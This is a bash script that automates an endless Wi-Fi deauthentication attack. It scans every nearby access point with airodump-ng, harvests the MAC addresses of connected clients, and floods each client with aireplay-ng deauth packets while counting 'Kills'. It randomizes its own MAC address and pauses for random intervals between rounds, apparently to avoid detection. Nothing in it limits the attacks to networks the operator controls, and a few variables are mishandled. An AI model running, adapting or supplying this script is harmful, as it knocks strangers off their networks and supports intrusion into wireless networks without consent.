#!/bin/bash
# by DevHrefTry
kills=0
infofile="infodump"
wififile="wifidump.txt"
sudo rm $infofile*;
sudo killall NetworkManager && sudo killall NetworkManagerDispatcher && killall wpa_supplicant
read -p "Enter the Interface you would like to use : " int
read -p "Enter aditional options to airodump-ng: " options
read -p "Enter time for Wi-fi scann: " twifi
read -p "Enter time for Wi-fi info scann: " tmac
read -p "Enter time for Clients scan: " tmac2
read -p "Enter minimal time for random pause (-+500sec will be added): " tdefault
if [ -z "$twifi" ]; then
twifi=10
fi
if [ -z "$tmac" ]; then
tmac=5
fi
if [ -z "$tmac2" ]; then
tmac=5
fi
if [ -z "$tdefault" ]; then
tdefault=140
fi
sudo ifconfig $int"mon" down;
sudo airmon-ng stop $int"mon";
sudo ifconfig $int up;
	while :;
do
	echo "Random MAC on $int ..."
	sleep 2
	sudo ifconfig $int down && sudo macchanger -r $int && sudo macchanger -r $inf && ifconfig $inf up
	sudo killall NetworkManager && sudo killall NetworkManagerDispatcher && killall wpa_supplicant && sudo airmon-ng check kill

	sudo rm $infofile*;
	sudo ifconfig $int down;
        sudo airmon-ng start $int;
        sudo ifconfig $int"mon" up;
        sudo xterm -e airodump-ng $options -w $infofile $int"mon" &
                for((i=$twifi; i>=0; i--))
                do
                sleep 1
                clear
                echo  "collecting Wi-fis for: $i seconds"
                done

        killall airodump-ng

        cat "$infofile"-01.kismet.netxml | grep BSSID | cut -d '<' -f2 |  cut -d '>' -f2 > $wififile
        cat $wififile | sort -u > temp
        num_clients=`cat $wififile | wc -l`
        wifis=`cat $wififile | grep -v "MAC" | grep -v "MAC2" `
	sudo rm $infofile*;
        echo "wifis: "
        echo "$wifis"
for b in $wifis; do
	ap="$b"
	infofile="infodump"
	sudo rm $infofile*;
	macfile="macdump.txt"
	channelfile="channel.txt"
	sudo xterm -e airodump-ng $options --bssid $ap -w $infofile $int"mon" &
		for((i=$tmac; i>=0; i--))
	        do
        	sleep 1
	        clear
	        echo  "Collecting info on $ap for: $i seconds"
		echo "Kills: $kills"
	        done

	 killall airodump-ng
	sleep 1
	tac "$infofile"-01.kismet.netxml | grep -m 1 channel | cut -d '<' -f2 |  cut -d '>' -f2 > $channelfile
	channel=`cat $channelfile`
	sudo rm $infofile*;
	if [ -z "$channel" ]; then
		echo "AP not found!";
	else
	sudo xterm -e airodump-ng $options --bssid $ap -w $infofile -c $channel $int"mon" &
                for((i=$tmac2; i>=0; i--))
                do
                sleep 1
                clear
                echo  "Colecting clients on $ap at $channel for: $i seconds"
		echo "Kills: $kills"
                done

         killall airodump-ng
	cat "$infofile"-01.kismet.netxml | grep client-mac | cut -d '<' -f2 |  cut -d '>' -f2 > $macfile
	macs=`cat $macfile`
	echo "Clients: "
	echo "$macs"
	sudo xterm -e airodump-ng $options --bssid $ap -w $infofile -c $channel $int"mon" &
	for v in $macs; do
		sudo aireplay-ng -0 10 -a "$ap" -c "$v" $int"mon";
		kills=$(($kills+1))
        done
	sleep 1
	fi
	killall airodump-ng
	done
	sudo ifconfig $int"mon" down;
	sudo airmon-ng stop $int"mon";
	sudo ifconfig $int up;
	sleep 1
	killall airmon-ng
	killall aireplay-ng
	killall airodump-ng
	tpause=$((( RANDOM % 500 ) + $tdefault))
	for((i=$tpause; i>=0; i--))
	do
	sleep 1
	clear
	echo "next attack in: $i seconds"
	echo "Kills: $kills"
	done
	sudo rm $infofile*;
done
